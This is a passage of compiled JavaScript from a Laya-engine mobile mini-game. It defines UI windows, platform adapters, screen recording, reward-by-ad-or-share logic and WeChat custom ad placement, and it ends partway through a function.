            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
        }
        onHide() {
            super.onHide();
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                if (ConfigMgr.longPhone == 0) {
                    Game.PlatAdUtil.hideBannerAd();
                }
            }
            else {
                Game.PlatAdUtil.hideBannerAd();
            }
            if (Game.GameCfg.plat == Game.PlatType.wx) {
                Game.MultiPlatforms.hideCustom1();
                Game.MultiPlatforms.hideCustom2();
                Game.MultiPlatforms.createCustom1("home");
                Game.MultiPlatforms.createCustom2("home");
            }
        }
    }
    Game.MySignWindow = MySignWindow;
    passer.plugin.fast.SignWindow = MySignWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MySuccessWindow extends passer.plugin.fast.GameSuccessWindow {
        constructor() {
            super();
        }
        bindChild() {
            super.bindChild();
            this.home_bt = this.getButton("home");
            this.rankLabel = this.infoLdr.component.getChild("n25").asCom.getChild("n27").asLabel;
            this.trophyLabel = this.infoLdr.component.getChild("n30").asLabel;
            this.othertrophyLabel = this.infoLdr.component.getChild("n38").asLabel;
            this.mapNameLabel = this.infoLdr.component.getChild("n28").asLabel;
            this.rewardList = this.infoLdr.component.getChild("n37").asList;
            this.overCoinLabel = this.getLabel("coin.title");
            this.otherCoinLabel = this.getLabel("n22");
            mvc.on(Game.fast.MsgKey.ON_GAME_NEXT, this, () => {
                this.showHome();
            });
        }
        showHome() {
            this.backToHome();
        }
        backToHome() {
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                if (Game.gameSwitch == 1 && Game.gameNative <= Game.Datas.gameNums) {
                    Game.PlatAdUtil.clickNativeAd();
                }
            }
            Game.GameManager.instance.GameStart.GameInit();
            Game.SoundManager.playBGM(Game.SoundManager.soundName.Audio_bgm_main, true);
            Game.fast.showHomeScene();
            ;
        }
        onClickButton(btn) {
            super.onClickButton(btn);
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
            k7.xsdk.agentManager.getAnalyticsGroup().onButtonClick({
                button_name: String(btn.name),
                button_path: "SuccessWindow",
            });
            switch (btn) {
                case this.home_bt:
                    Game.GameManager.instance.GameStart.GameInit();
                    Game.SoundManager.playBGM(Game.SoundManager.soundName.Audio_bgm_main, true);
                    break;
            }
        }
        onShown() {
            super.onShown();
            Game.Datas.gameNums += 1;
            Laya.LocalStorage.setItem("gameNums", String(Game.Datas.gameNums));
            if (ConfigMgr.Match_Num == 0) {
                this.infoLdr.component.getController("c1").selectedIndex = 0;
            }
            else {
                this.infoLdr.component.getController("c1").selectedIndex = 1;
                this.rankLabel.text = (ConfigMgr.Match_Num + 1).toString();
            }
            let trophyNowNum = Game.Datas.grailNum;
            let trophyAddNum = Game.ViewManager.rewardData.grail;
            let CoinNowNum = Game.ViewManager.rewardData.gold;
            let CoinAddNum = (ConfigMgr.allpeoples - ConfigMgr.Match_Num) * 6;
            this.trophyLabel.text = "" + Game.Datas.grailNum;
            this.othertrophyLabel.text = "+" + Game.ViewManager.rewardData.grail.toString();
            Game.Datas.grailNum += Game.ViewManager.rewardData.grail;
            for (let i = Arena.length - 1; i >= 0; i--) {
                if (Game.Datas.grailNum >= Arena[i].grailNum) {
                    ConfigMgr.Map_Name = Arena[i].id;
                    if (Game.Datas.mapLands[i] == 0) {
                        Game.Datas.mapLands[i] = 1;
                        ConfigMgr.newLand = i;
                        if (Game.platMgr.plat.platType == Game.PlatType.wx) {
                            k7.AppWindow.show(Game.UnLockWindow);
                        }
                        k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                            custom_event_name: "shockMap",
                            custom_scene_name: ConfigMgr.Map_Name,
                            custom_string: ConfigMgr.Map_Name
                        });
                    }
                    for (let j = 0; j < Hammer.length; j++) {
                        if (Hammer[j].get == 4) {
                            if ((i + 1) >= Hammer[j].arenaLevel) {
                                if (Game.Datas.hammerDatas[j] == 0) {
                                    Game.Datas.hammerDatas[j] = 1;
                                }
                            }
                        }
                    }
                    break;
                }
            }
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "SuccessWindow",
                window_path: "fast",
            });
            if (this.mapNameLabel) {
                this.mapNameLabel.text = ConfigMgr.Map;
            }
            if (Game.overMaterial.length == 0) {
                this.rewardList.getController("c1").selectedIndex = 0;
                let item = this.rewardList.getChildAt(0).asCom;
                item.getChild("icon").asLoader.url = "ui://peq2rr6tl9b86d";
            }
            else {
                let num = Game.overMaterial.length;
                this.rewardList.getController("c1").selectedIndex = num - 1;
                for (let i = 0; i < Game.overMaterial.length; i++) {
                    let item = this.rewardList.getChildAt(i).asCom;
                    let res = Game.overMaterial[i];
                    item.getChild("icon").asLoader.url = res;
                }
            }
            Game.Datas.setData();
            this.infoLdr.component.getTransition("t0").play();
            let rank = ConfigMgr.Match_Num;
            let rankstr = "";
            if (rank < 10) {
                rankstr = "0" + String(rank);
            }
            else {
                rankstr = String(rank);
            }
            k7.xsdk.agentManager.getAnalyticsGroup().onGameEnd({
                game_play_id: Game.game_map + "0" + rankstr,
                game_play_name: "hammer",
                game_break: false,
                game_win: true
            });
            let times = Math.floor((new Date().getTime() - ConfigMgr.gameTime) / 1000);
            k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                custom_event_name: "gameTime",
                custom_scene_name: Game.game_map + "0" + rankstr,
                custom_string: String(times)
            });
            this.otherCoinLabel.text = "+ " + (ConfigMgr.allpeoples - ConfigMgr.Match_Num) * 6;
            Game.fast.ecoProxy.addCoin((ConfigMgr.allpeoples - ConfigMgr.Match_Num) * 6);
            Laya.timer.once(750, this, () => {
                this.Decreasing(this.overCoinLabel, this.otherCoinLabel, CoinNowNum, CoinAddNum);
                this.Decreasing(this.trophyLabel, this.othertrophyLabel, trophyNowNum, trophyAddNum);
            });
            if (ConfigMgr.firstGame == 1) {
                this.getController("c4").selectedIndex = 0;
                this.getController("c5").selectedIndex = 1;
            }
            else {
                this.getController("c4").selectedIndex = 1;
                this.getController("c5").selectedIndex = 0;
            }
            Game.PlatAdUtil.showBannerAd();
            if (Game.GameCfg.plat == Game.PlatType.wx) {
                Game.PlatAdUtil.showInterAd();
                Game.MultiPlatforms.createCustom1("over");
                Game.MultiPlatforms.createCustom2("over");
            }
            else if (Game.GameCfg.plat == Game.PlatType.mz) {
                if (Game.gameSwitch == 1) {
                    Laya.timer.once(1000, this, () => {
                        Game.PlatAdUtil.showInterAd();
                    });
                }
                else {
                    Game.PlatAdUtil.showInterAd();
                }
            }
            else if (Game.GameCfg.plat == Game.PlatType.vivo) {
                console.log("展示插屏");
                Game.VivoPlat.createInterstitialAd();
            }
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
        }
        onHide() {
            super.onHide();
            this.getController("c5").selectedIndex = 0;
        }
        onClickRewardButton() {
            Game.rpMgr.getReward(Game.RewardPointId.ResultDouble, this.onRewardSuccess.bind(this), this.onRewardFailed.bind(this));
        }
        refreshUi() {
            super.refreshUi();
            Game.rpMgr.setUIController(Game.RewardPointId.ResultDouble, this.rewardButton.getController("c1"));
            mvc.send(GameEvt.GAMEOVER_SHOW);
        }
        onReward() {
            super.onReward();
            Game.fast.ecoProxy.addCoin((ConfigMgr.allpeoples - ConfigMgr.Match_Num) * 6);
        }
        Decreasing(rise, drop, nowNum, num) {
            Laya.timer.once(10, this, () => {
                num -= 1;
                nowNum += 1;
                rise.text = nowNum.toString();
                drop.text = "+" + num.toString();
                if (num <= 0) {
                    drop.text = "";
                    return;
                }
                else {
                    this.Decreasing(rise, drop, nowNum, num);
                }
            });
        }
    }
    Game.MySuccessWindow = MySuccessWindow;
    passer.plugin.fast.GameSuccessWindow = MySuccessWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class ShareVideoWindow extends k7.AppWindow {
        constructor() {
            super('share', 'Game');
        }
        bindChild() {
            this._shareBtn = this.getButton('n6');
            this._exitBtn = this.getButton('n1');
        }
        onClickButton(button) {
            switch (button) {
                case this._shareBtn:
                    this.shareGain();
                    break;
                case this._exitBtn:
                    this.exit();
                    break;
            }
        }
        shareGain() {
            if (Game.RecordManger.getInstance().tempRecordUrl) {
                Game.TTGameAdapter.shareApp({
                    channel: Game.ShareType.VIDEO,
                    recordUrl: Game.RecordManger.getInstance().tempRecordUrl,
                    success: () => {
                        Game.fast.ecoProxy.addCoin(500);
                        Game.MultiPlatforms.showToast('获得金币500');
                        this.exit();
                    },
                    fail: () => {
                        Game.MultiPlatforms.showToast('分享失败');
                    }
                });
            }
            else {
                console.log('没有录屏');
            }
        }
        exit() {
            Game.ViewManager.showGameSuccess();
            this.hide();
        }
    }
    Game.ShareVideoWindow = ShareVideoWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class TryWindow extends k7.AppWindow {
        constructor() {
            super("try", "Game");
        }
        bindChild() {
            this.reward_bt = this.getButton("reward");
            this.close_bt = this.getButton("n5");
            this.close_bt2 = this.getButton("next_wd");
            this.skinLoader = this.getLoader("icon");
        }
        onClickButton(btn) {
            switch (btn) {
                case this.close_bt:
                    this.hide();
                    break;
                case this.close_bt2:
                    this.hide();
                    break;
                case this.reward_bt:
                    Game.rpMgr.getReward(Game.RewardPointId.RigisterDouble, this.onRewardSuccess.bind(this), this.onRewardFailed.bind(this));
                    break;
            }
        }
        onRewardSuccess() {
            if (ConfigMgr.game_SkinData.name == "hammer") {
                let model = Game.GameManager.instance.SceneManager.setHammerSkin(Hammer[ConfigMgr.game_SkinData.index].model, Game.GameManager.instance.SceneManager.player);
                model.active = true;
            }
            else {
                let model = Game.GameManager.instance.SceneManager.setPlayerSkin(Skin[ConfigMgr.game_SkinData.index].model, Game.GameManager.instance.SceneManager.player);
                model.active = true;
            }
            this.hide();
        }
        onRewardFailed() {
        }
        refreshUi() {
            Game.rpMgr.setUIController(Game.RewardPointId.ResultDouble, this.reward_bt.getController("c1"));
        }
        onShown() {
            if (ConfigMgr.game_SkinData.name == "hammer") {
                this.skinLoader.url = "ui://icon/" + Hammer[ConfigMgr.game_SkinData.index].icon;
            }
            else {
                this.skinLoader.url = "ui://icon/" + Skin[ConfigMgr.game_SkinData.index].icon;
            }
            Game.PlatAdUtil.showBannerAd();
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
                this.getController("oppo").selectedIndex = 1;
            }
            else {
                this.getController("oppo").selectedIndex = 0;
            }
        }
        onHide() {
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "TryWindow",
                window_path: "GameScene",
            });
            if (Game.platMgr.plat.platType == Game.PlatType.oppo || Game.platMgr.plat.platType == Game.PlatType.vivo) {
            }
            else {
                Game.PlatAdUtil.hideBannerAd();
            }
        }
    }
    Game.TryWindow = TryWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class UnLockWindow extends k7.AppWindow {
        constructor() {
            super("unlock", "Game");
        }
        onEvent() {
        }
        bindChild() {
            this.close_btn = this.getButton("n5");
            this.share_btn = this.getButton("n3");
            this.map = this.getComp("n2");
        }
        onClickButton(btn) {
            switch (btn) {
                case this.close_btn:
                    this.hide();
                    break;
                case this.share_btn:
                    Game.PlatShareUtil.share(Game.RewardPointId.mapShare, null, null);
                    break;
            }
        }
        refreshUi() {
        }
        onShown() {
            this.getTransition("t0").play();
            this.getController("c1").selectedIndex = ConfigMgr.newLand;
            this.map.getController("c1").selectedIndex = ConfigMgr.newLand;
        }
        onHide() {
        }
    }
    Game.UnLockWindow = UnLockWindow;
})(Game || (Game = {}));
var ConfigMgr;
(function (ConfigMgr) {
    ConfigMgr.LEVEL_LOWER = 10;
    ConfigMgr.LEVEL_LOW = 18;
    ConfigMgr.LEVEL_MIDDLE = 22;
    ConfigMgr.Load_3D_Over = 0;
    ConfigMgr.Load_FAST_Over = 0;
    ConfigMgr.AI_Information = [];
    ConfigMgr.allpeoples = 0;
    ConfigMgr.Match_Num = 8;
    ConfigMgr.Map_Name = "";
    ConfigMgr.Map = "";
    ConfigMgr.firstGame = 0;
    ConfigMgr.obstacleName = "zhiwu1";
    ConfigMgr.nowLand = 0;
    ConfigMgr.newLand = 0;
    ConfigMgr.Commercialization = 0;
    ConfigMgr.game_rank = 8;
    ConfigMgr.gameTime = 0;
    ConfigMgr.game_SkinData = { name: "", index: 0 };
    ConfigMgr.manygame_switch = 0;
    ConfigMgr.adddesk_switch = 0;
    ConfigMgr.closeAddDesk = "closeAddDesk";
    ConfigMgr.longPhone = 0;
    ConfigMgr.fixedWidth = 0;
})(ConfigMgr || (ConfigMgr = {}));
var Game;
(function (Game) {
    class PlatMgr {
        static get inst() {
            PlatMgr._inst = PlatMgr._inst || new PlatMgr();
            return PlatMgr._inst;
        }
        init() {
            console.log("plat:", Game.GameCfg.plat);
            switch (Game.GameCfg.plat) {
                case Game.PlatType.wx:
                    this.plat = new Game.WxPlat(Game.GameCfg.plat);
                    break;
                case Game.PlatType.tt:
                    this.plat = new Game.TtPlat(Game.GameCfg.plat);
                    break;
                case Game.PlatType.mz:
                    this.plat = new Game.MzPlat(Game.GameCfg.plat);
                    break;
                case Game.PlatType.bd:
                    this.plat = new Game.BdPlat(Game.GameCfg.plat);
                    break;
                case Game.PlatType.huawei:
                    this.plat = new Game.HwPlat(Game.GameCfg.plat);
                    break;
                case Game.PlatType.oppo:
                    this.plat = new Game.OppoPlat(Game.GameCfg.plat);
                    break;
                case Game.PlatType.vivo:
                    this.plat = new Game.VivoPlat(Game.GameCfg.plat);
                    break;
                case Game.PlatType.uc:
                    this.plat = new Game.UCPlat(Game.GameCfg.plat);
                    break;
                case Game.PlatType.pt4399:
                    this.plat = new Game.Pt4399Plat(Game.GameCfg.plat);
                    break;
                default:
                    this.plat = new Game.WebPlat(Game.GameCfg.plat);
                    break;
            }
            this.plat.init();
            Game.PlatShareUtil.init();
            Game.rpMgr.setVideoAndShareCallback(Game.PlatAdUtil.showVideoAd, Game.PlatShareUtil.share.bind(Game.PlatShareUtil));
            Game.NetWorkMar.Init();
        }
    }
    Game.PlatMgr = PlatMgr;
    Game.platMgr = PlatMgr.inst;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class RecordManger {
        constructor() {
            this.isRecording = false;
            this._startRecordTime = -1;
            this.GameRecorderManager = null;
            this.pauseing = false;
            this.tempRecordUrl = null;
            this._duration = 0;
        }
        static getInstance() {
            if (RecordManger.instance == null) {
                RecordManger.instance = new RecordManger();
            }
            return RecordManger.instance;
        }
        initManager() {
            if (!this.GameRecorderManager && Game.platMgr.plat.platType == Game.PlatType.tt) {
                if (window['tt'].getSystemInfoSync().platform == 'devtools')
                    return;
                this.GameRecorderManager = window["tt"].getGameRecorderManager();
                this.listenRecorderEvent();
            }
        }
        startGameRecorder(duration = 60, timeUpCallback) {
            if (this.GameRecorderManager) {
                this._timeUpCallback = timeUpCallback;
                this._duration = duration;
                this._startRecordTime = Date.now();
                this.isRecording = true;
                this.GameRecorderManager && this.GameRecorderManager.start({
                    duration: duration
                });
                this.tempRecordUrl = null;
            }
        }
        get isRecord() {
            return this.isRecording;
        }
        get isPause() {
            return this.pauseing;
        }
        pauseGameRecorder() {
            this.GameRecorderManager && this.GameRecorderManager.pause && this.GameRecorderManager.pause();
            this.isRecording = false;
            this.pauseing = true;
        }
        resumeGameRecorder() {
            this.GameRecorderManager && this.GameRecorderManager.resume && this.GameRecorderManager.resume();
            this.isRecording = true;
            this.pauseing = false;
        }
        stopGameRecorder(callback) {
            console.log('call stop 录屏');
            this.isRecording = false;
            this._stopRecordCallback = callback;
            this.GameRecorderManager && this.GameRecorderManager.stop();
        }
        isSupportRecord() {
            let support = this.GameRecorderManager ? true : false;
            return support;
        }
        getHasRecord() {
            console.log('this.tempRecordUrl', this.tempRecordUrl);
            let exist = this.tempRecordUrl ? true : false;
            return exist;
        }
        _timeUp() {
            this.stopGameRecorder();
        }
        _startRecordTimeListen() {
            let d = (this._duration * 1000) - (Date.now() - this._startRecordTime);
            if (d > 0) {
                Laya.timer.once(d, this, this._timeUp);
            }
        }
        listenRecorderEvent() {
            if (!this.GameRecorderManager) {
                console.log("当前版本不支持录屏");
                return;
            }
            this.GameRecorderManager.onStart(() => {
                console.log("录屏开始");
                Laya.timer.clearAll(this);
                this._startRecordTimeListen();
            });
            this.GameRecorderManager.onPause(() => {
                console.log("录屏暂停");
                Laya.timer.clearAll(this);
            });
            this.GameRecorderManager.onResume(() => {
                console.log("录屏恢复");
                this._startRecordTimeListen();
            });
            this.GameRecorderManager.onStop(res => {
                console.log("录屏结束", res.videoPath);
                if (Date.now() - this._startRecordTime < 3000) {
                    console.log('录屏时长低于3秒');
                }
                else {
                    this.tempRecordUrl = res.videoPath;
                }
                Laya.timer.clearAll(this);
                mvc.send(RecordManger.Stop_Recorder);
                if (!!this._stopRecordCallback)
                    this._stopRecordCallback();
                if (!!this._timeUpCallback)
                    this._timeUpCallback();
            });
            this.GameRecorderManager.onError(err => {
                console.log("录屏异常", err);
                Laya.timer.clearAll(this);
            });
        }
    }
    RecordManger.instance = null;
    RecordManger.Stop_Recorder = "Stop_Recorder";
    Game.RecordManger = RecordManger;
    Game.recordMgr = RecordManger.getInstance();
})(Game || (Game = {}));
var Game;
(function (Game) {
    let RewardPointId;
    (function (RewardPointId) {
        RewardPointId[RewardPointId["Test"] = 1] = "Test";
        RewardPointId[RewardPointId["Revive"] = 2] = "Revive";
        RewardPointId[RewardPointId["ResultDouble"] = 3] = "ResultDouble";
        RewardPointId[RewardPointId["RigisterDouble"] = 4] = "RigisterDouble";
        RewardPointId[RewardPointId["Luck"] = 5] = "Luck";
        RewardPointId[RewardPointId["RewardDouble"] = 6] = "RewardDouble";
        RewardPointId[RewardPointId["hammerShop"] = 7] = "hammerShop";
        RewardPointId[RewardPointId["NotEnough"] = 8] = "NotEnough";
        RewardPointId[RewardPointId["Try_Reward"] = 9] = "Try_Reward";
        RewardPointId[RewardPointId["mapShare"] = 10] = "mapShare";
        RewardPointId[RewardPointId["changeScale"] = 11] = "changeScale";
        RewardPointId[RewardPointId["ForceVideo"] = 12] = "ForceVideo";
    })(RewardPointId = Game.RewardPointId || (Game.RewardPointId = {}));
    class RewardPoint {
        constructor() {
            this.rpList = {};
        }
        init() {
            this.rpList = {
                [RewardPointId.Test]: { id: RewardPointId.Test, type: Game.RewardType.Share, name: "测试" },
                [RewardPointId.Revive]: { id: RewardPointId.Revive, type: Game.RewardType.Share, name: "复活" },
                [RewardPointId.ResultDouble]: { id: RewardPointId.ResultDouble, type: Game.RewardType.Share, name: "结算双倍" },
                [RewardPointId.RigisterDouble]: { id: RewardPointId.RigisterDouble, type: Game.RewardType.Share, name: "签到双倍" },
                [RewardPointId.Luck]: { id: RewardPointId.Luck, type: Game.RewardType.Share, name: "转盘" },
                [RewardPointId.RewardDouble]: { id: RewardPointId.RewardDouble, type: Game.RewardType.Share, name: "双倍" },
                [RewardPointId.hammerShop]: { id: RewardPointId.hammerShop, type: Game.RewardType.Share, name: "购买锤子" },
                [RewardPointId.NotEnough]: { id: RewardPointId.NotEnough, type: Game.RewardType.Share, name: "金币不足" },
                [RewardPointId.Try_Reward]: { id: RewardPointId.Try_Reward, type: Game.RewardType.Share, name: "试用" },
                [RewardPointId.mapShare]: { id: RewardPointId.mapShare, type: Game.RewardType.Share, name: "新地图分享" },
                [RewardPointId.changeScale]: { id: RewardPointId.changeScale, type: Game.RewardType.Share, name: "变大" },
                [RewardPointId.ForceVideo]: { id: RewardPointId.ForceVideo, type: Game.RewardType.Video, name: "结算强制拉取视频" },
            };
        }
    }
    Game.RewardPoint = RewardPoint;
})(Game || (Game = {}));
var Game;
(function (Game) {
    let RewardType;
    (function (RewardType) {
        RewardType[RewardType["NoAd"] = 0] = "NoAd";
        RewardType[RewardType["Video"] = 1] = "Video";
        RewardType[RewardType["Share"] = 2] = "Share";
        RewardType[RewardType["FirstVideoThenShare"] = 3] = "FirstVideoThenShare";
        RewardType[RewardType["FirstShareThenVideo"] = 4] = "FirstShareThenVideo";
    })(RewardType = Game.RewardType || (Game.RewardType = {}));
    class RewardPointMgr {
        constructor() {
            this._uiCallbackHash = {};
            this._maxFirstShareCount = 5;
            this._rewardPoint = new Game.RewardPoint();
            this._rewardPoint.init();
        }
        static get inst() {
            RewardPointMgr._instance = RewardPointMgr._instance || new RewardPointMgr();
            return RewardPointMgr._instance;
        }
        get crtRewardId() {
            return this._crtRewardId;
        }
        get crtRewardItem() {
            if (this._crtRewardId < 0)
                return null;
            return this.getRewardItem(this._crtRewardId || 0);
        }
        setMaxFirstShareCount(cnt = 5) {
            this._maxFirstShareCount = cnt;
        }
        getRewardItem(rId) {
            return this._rewardPoint.rpList[rId];
        }
        getRpList() {
            return this._rewardPoint.rpList;
        }
        setUICallback(rId, callback) {
            this._uiCallbackHash[rId] = callback;
            if (!!callback)
                callback();
        }
        setUIController(rId, ctrl) {
            let ritem = this.getRewardItem(rId);
            let tempType = RewardType.NoAd;
            switch (ritem.type) {
                case RewardType.NoAd:
                case RewardType.Share:
                case RewardType.Video:
                    tempType = ritem.type;
                    break;
                case RewardType.FirstVideoThenShare:
                    if (Game.PlatAdUtil.hasVideoAd()) {
                        tempType = RewardType.Video;
                    }
                    else {
                        tempType = RewardType.Share;
                    }
                    break;
                case RewardType.FirstShareThenVideo:
                    if (this._maxFirstShareCount > 0) {
                        tempType = RewardType.Share;
                    }
                    else {
                        tempType = RewardType.Video;
                    }
                    break;
                default:
                    break;
            }
            ctrl && (ctrl.selectedIndex = tempType);
            if (tempType == RewardType.Share) {
                k7.xsdk.agentManager.getAnalyticsGroup().onShareShow({
                    share_id: "",
                    share_title: "",
                    share_scene_id: rId + "",
                    share_scene_name: ritem.name
                });
            }
            else if (tempType == RewardType.Video) {
                k7.xsdk.agentManager.getAnalyticsGroup().onVideoShow({
                    video_scene_id: rId + "",
                    video_scene_name: ritem.name
                });
            }
            return tempType;
        }
        setVideoAndShareCallback(showVideoAdFunc, shareFunc) {
            this._videoFunc = showVideoAdFunc;
            this._shareFunc = shareFunc;
        }
        getReward(rId, success, fail, complete) {
            let rewardCell = this.getRewardItem(rId);
            if (!rewardCell) {
                console.log('无当前奖励点，请注意');
                return;
            }
            this._crtRewardId = rId;
            switch (rewardCell.type) {
                case RewardType.NoAd:
                    if (!!success)
                        success();
                    break;
                case RewardType.Video:
                    this._videoFunc(rId, success, fail, complete);
                    break;
                case RewardType.Share:
                    this._shareFunc(rId, success, fail);
                    break;
                case RewardType.FirstVideoThenShare:
                    if (Game.PlatAdUtil.hasVideoAd()) {
                        this._videoFunc(rId, success, fail, complete);
                    }
                    else {
                        this._shareFunc(rId, success, fail);
                    }
                    break;
                case RewardType.FirstShareThenVideo:
                    if (this._maxFirstShareCount > 0) {
                        this._shareFunc(rId, () => {
                            this._maxFirstShareCount--;
                            if (!!success)
                                success();
                        }, fail);
                    }
                    else {
                        this._videoFunc(rId, success, fail, complete);
                    }
                    break;
                default:
                    break;
            }
        }
    }
    Game.RewardPointMgr = RewardPointMgr;
    Game.rpMgr = RewardPointMgr.inst;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class TimeTools {
        constructor() {
        }
        static isSameDay(time1, time2) {
            var d = new Date(time1);
            d.setHours(0, 0, 0, 0);
            var zore1 = d.getTime();
            d.setTime(time2);
            d.setHours(0, 0, 0, 0);
            if (zore1 == d.getTime())
                return true;
            return false;
        }
        static getCrtTime() {
            let d = new Date();
            return d.getTime();
        }
        static format(time, style = "auto") {
            var s = time % 60;
            time = Math.floor(time / 60);
            var m = time % 60;
            var h = Math.floor(time / 60);
            if (style == "h:m:s") {
                return this.fullNumLen(h) + "：" + this.fullNumLen(m) + "：" + this.fullNumLen(s);
            }
            return (h > 0 ? (this.fullNumLen(h) + "：") : "") + this.fullNumLen(m) + "：" + this.fullNumLen(s);
        }
        static fullNumLen(num, len = 2) {
            var numStr = num.toString();
            while (numStr.length < len) {
                numStr = "0" + numStr;
            }
            return numStr;
        }
    }
    Game.TimeTools = TimeTools;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class MultiPlatforms {
        constructor() {
        }
        static showToast(_title, _icon = "none", _duration = 2000) {
            if (Game.GameCfg.plat == Game.PlatType.oppo || Game.GameCfg.plat == Game.PlatType.huawei) {
                if (Laya.Browser.window.qg && Laya.Browser.window.qg.showToast) {
                    Laya.Browser.window.qg.showToast({
                        title: _title,
                        icon: _icon,
                        duration: _duration
                    });
                }
            }
            else if (Game.GameCfg.plat == Game.PlatType.vivo) {
                if (Laya.Browser.window.qg && Laya.Browser.window.qg.showToast) {
                    Laya.Browser.window.qg.showToast({
                        message: _title
                    });
                }
            }
            else if (Game.GameCfg.plat == Game.PlatType.wx || Game.GameCfg.plat == Game.PlatType.tt) {
                if (Laya.Browser.window.wx && Laya.Browser.window.wx.showToast) {
                    Laya.Browser.window.wx.showToast({
                        title: _title,
                        icon: _icon,
                        duration: _duration
                    });
                }
            }
            else if (Game.GameCfg.plat == Game.PlatType.mz) {
                Game.MzAd.showToast(_title);
            }
        }
        static vibrateShort() {
            if (Game.GameCfg.plat == Game.PlatType.tt || Game.GameCfg.plat == Game.PlatType.wx) {
                if (window['wx'] && wx['vibrateShort']) {
                    wx['vibrateShort']();
                }
            }
            else if (Game.GameCfg.plat == Game.PlatType.mz) {
                Game.MzAd.SetVibration(true);
            }
        }
        static vibrateLong() {
            if (Game.GameCfg.plat == Game.PlatType.tt || Game.GameCfg.plat == Game.PlatType.wx) {
                if (window['wx'] && wx['vibrateLong']) {
                    wx['vibrateLong']();
                }
            }
            else if (Game.GameCfg.plat == Game.PlatType.mz) {
                Game.MzAd.SetVibration(false);
            }
        }
        static AnalysisTimeStamp() {
            var date = new Date(Laya.Browser.now());
            var Y = String(date.getFullYear());
            var M = String(date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date.getMonth() + 1);
            var D = String(date.getDate() < 10 ? '0' + (date.getDate()) : date.getDate());
            var h = (date.getHours() < 10 ? '0' + date.getHours() : date.getHours());
            var m = (date.getMinutes() < 10 ? '0' + date.getMinutes() : date.getMinutes());
            var s = (date.getSeconds() < 10 ? '0' + date.getSeconds() : date.getSeconds());
            return Y + M + D;
        }
        static getViewScene() {
            if (Game.GameCfg.plat == Game.PlatType.wx) {
                let launch = Laya.Browser.window.wx.getLaunchOptionsSync();
                this.scene = launch.scene;
                this.query = launch.scene;
                console.log("场景值", this.scene, launch.query);
            }
        }
        static createCacheCustom() {
            if (Game.GameCfg.plat != Game.PlatType.wx)
                return;
            let realy = 70 / 145 * Laya.Browser.window.wx.getSystemInfoSync().screenHeight + (110 - 70 / 145 * 667);
            if (realy >= 200) {
                realy -= 15;
            }
            if (Laya.Browser.window.wx.createCustomAd) {
                let custom = Laya.Browser.window.wx.createCustomAd({
                    adUnitId: 'adunit-ccef9f38d409ea54',
                    style: {
                        left: Laya.Browser.window.wx.getSystemInfoSync().screenWidth / 2 - 25,
                        top: Laya.Browser.window.wx.getSystemInfoSync().screenHeight - realy,
                    }
                });
                custom.show().then(() => {
                    custom.hide();
                });
                custom.onLoad((res) => {
                    console.log(res, "加载原生广告成功2");
                    this.isloadcustomAd2 = true;
                });
                custom.onError((err) => {
                    console.log('原生广告加载失败', err);
                });
                return custom;
            }
        }
        static createCustom1(str = "") {
            console.log("当前高度", Laya.Browser.window.wx.getSystemInfoSync().screenHeight);
            this.custome1Str = str;
            let realy = 0;
            let realX = 0;
            if (str == "home") {
                if (Laya.Browser.window.wx.getSystemInfoSync().screenHeight <= 812) {
                    realy = -1 * (80 / 145) * Laya.Browser.window.wx.getSystemInfoSync().screenHeight + 100 + (80 / 145) * 667;
                }
                else {
                    realy = (10 / 84) * Laya.Browser.window.wx.getSystemInfoSync().screenHeight + 20 - (10 / 84) * 812;
                }
                realX = -150;
            }
            else if (str == "sign") {
                realX = -100;
            }
            else if (str == "game") {
                realX = -150;
                realy = (Laya.Browser.window.wx.getSystemInfoSync().screenHeight / 2.5 - 25) * -1;
            }
            else if (str == "over") {
                if (Laya.Browser.window.wx.getSystemInfoSync().screenHeight <= 812) {
                    realy = -1 * (80 / 145) * Laya.Browser.window.wx.getSystemInfoSync().screenHeight + 100 + (80 / 145) * 667;
                }
                else {
                    realy = (10 / 84) * Laya.Browser.window.wx.getSystemInfoSync().screenHeight + 20 - (10 / 84) * 812;
                }
                realX = -140;
            }
            if (Laya.Browser.window.wx.createCustomAd) {
                this.custom1 = Laya.Browser.window.wx.createCustomAd({
                    adUnitId: 'adunit-6418c23082fb7cc6',
                    style: {
                        left: Laya.Browser.window.wx.getSystemInfoSync().screenWidth / 2 - 25 + realX,
                        top: Laya.Browser.window.wx.getSystemInfoSync().screenHeight / 2 - 25 + realy,
                    }
                });
                this.custom1.show().then(() => {
                    this.custom1.show();
                });
                this.custom1.onLoad((res) => {
                    console.log(res, "加载原生广告成功2");
                });
                this.custom1.onError((err) => {
                    console.log('原生广告加载失败', err);
                });
                Laya.timer.loop(Game.nativetime * 1000, this, this.refreshCustome1);
            }
        }
        static refreshCustome1() {
            this.hideCustom1();
            this.createCustom1(this.custome1Str);
        }
        static hideCustom1() {
            Laya.timer.clear(this, this.refreshCustome1);
            if (this.custom1) {
                this.custom1.hide();
                this.custom1.destroy();
                this.custom1 = null;
            }
        }
        static createCustom2(str = "") {
            this.customeStr2 = str;
            let realy = 0;
            let realX = 0;
            if (str == "home") {
